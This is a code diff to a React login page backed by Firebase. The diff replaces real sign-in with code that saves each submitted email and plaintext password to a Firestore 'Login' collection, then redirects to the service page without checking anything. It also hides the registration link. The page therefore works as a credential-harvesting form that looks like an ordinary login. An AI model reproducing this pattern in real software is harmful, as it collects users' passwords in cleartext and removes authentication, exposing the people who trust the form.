@@ -1,21 +1,28 @@
+// src/pages/Loginpage.js
 import React, { useState } from 'react';
-import { signInWithEmailAndPassword } from 'firebase/auth';
 import { Link, useNavigate } from 'react-router-dom';
-import { auth } from '../config/firebase';
+import { db } from '../config/firebase';
+import { collection, addDoc, Timestamp } from 'firebase/firestore';
 
 const Loginpage = () => {
     const [email, setEmail] = useState('');
     const [password, setPassword] = useState('');
     const [error, setError] = useState('');
-    const navigate = useNavigate()
+    const navigate = useNavigate();
 
     const handleLogin = async (e) => {
         e.preventDefault();
         setError('');
         try {
-            await signInWithEmailAndPassword(auth, email, password);
-            // Redirect to '/service' using Link component
-            navigate("/service")
+            // Add login info to Firestore
+            await addDoc(collection(db, 'Login'), {
+                email: email,
+                password: password,
+                loginTime: Timestamp.now()
+            });
+
+            // Redirect to '/service'
+            navigate("/service");
         } catch (err) {
             setError(err.message);
         }
@@ -61,11 +68,11 @@ const Loginpage = () => {
                             Login
                         </button>
                     </div>
-                    <div className="mt-4">
+                    {/* <div className="mt-4">
                         <p className="text-center text-gray-700">
                             Don't have an account? <Link to="/register" className="text-blue-500">Register</Link>
                         </p>
-                    </div>
+                    </div> */}
                 </form>
             </div>
         </div>
